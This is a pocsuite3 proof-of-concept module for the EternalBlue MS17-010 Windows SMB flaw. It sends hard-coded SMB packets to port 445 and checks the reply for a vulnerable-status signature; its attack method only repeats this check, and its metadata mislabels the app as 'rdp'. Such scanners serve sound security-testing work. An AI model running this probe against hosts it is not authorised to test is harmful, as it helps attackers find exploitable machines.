# coding=utf-8
import socket
import binascii
from pocsuite3.api import Output, POCBase, register_poc, logger

class Eternalblue(POCBase):
    vulID = '97952'
    version = '1.0'
    author = ['big04dream']
    vulDate = '2017-04-15'
    createDate = '2019-10-11'
    updateDate = '2019-10-11'
    references = ['https://www.seebug.org/vuldb/ssvid-97952']
    name = 'Eternalblue - Windows SMB Remote Code Execution (MS17-010)'
    appPowerLink = 'https://www.microsoft.com'
    appName = 'rdp'
    appVersion = 'Windows Xp - Windows 2012'
    vulType = 'rce'
    desc = '''
    Windows SMB Remote Code Execution (MS17-010)
    '''
    
    def _verify(self):
        result = {}
        ip = self.url.split('//')[1].encode()
        port = 445
        negotiate_protocol_request = binascii.unhexlify(
            "00000054ff534d42720000000018012800000000000000000000000000002f4b0000c55e003100024c414e4d414e312e3000024c4d312e325830303200024e54204c414e4d414e20312e3000024e54204c4d20302e313200")
        session_setup_request = binascii.unhexlify(
            "00000063ff534d42730000000018012000000000000000000000000000002f4b0000c55e0dff000000dfff02000100000000000000000000000000400000002600002e0057696e646f7773203230303020323139350057696e646f7773203230303020352e3000")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((ip, port))
            s.send(negotiate_protocol_request)
            s.recv(1024)
            s.send(session_setup_request)
            data = s.recv(1024)
            user_id = data[32:34]
            tree_connect_andx_request = "000000%xff534d42750000000018012000000000000000000000000000002f4b%sc55e04ff000000000001001a00005c5c%s5c49504324003f3f3f3f3f00" % ((58 + len(ip)), user_id.hex(), ip.hex())
            s.send(binascii.unhexlify(tree_connect_andx_request))
            data = s.recv(1024)
            allid = data[28:36]
            payload = "0000004aff534d422500000000180128000000000000000000000000%s1000000000ffffffff0000000000000000000000004a0000004a0002002300000007005c504950455c00" % allid.hex()
            s.send(binascii.unhexlify(payload))
            data = s.recv(1024)
            if b"\x05\x02\x00\xc0" in data:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['Target'] = ip.decode()
                result['VerifyInfo']['INFO'] = 'Target %s:%d vulnerability' % (ip.decode(), port)
            s.close()
        except Exception as e:
            logger.info(e)
        return self.parse_output(result)
        
    
    def _attack(self):
        return self._verify()
        
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('not MS17-010')
        return output
    
register_poc(Eternalblue)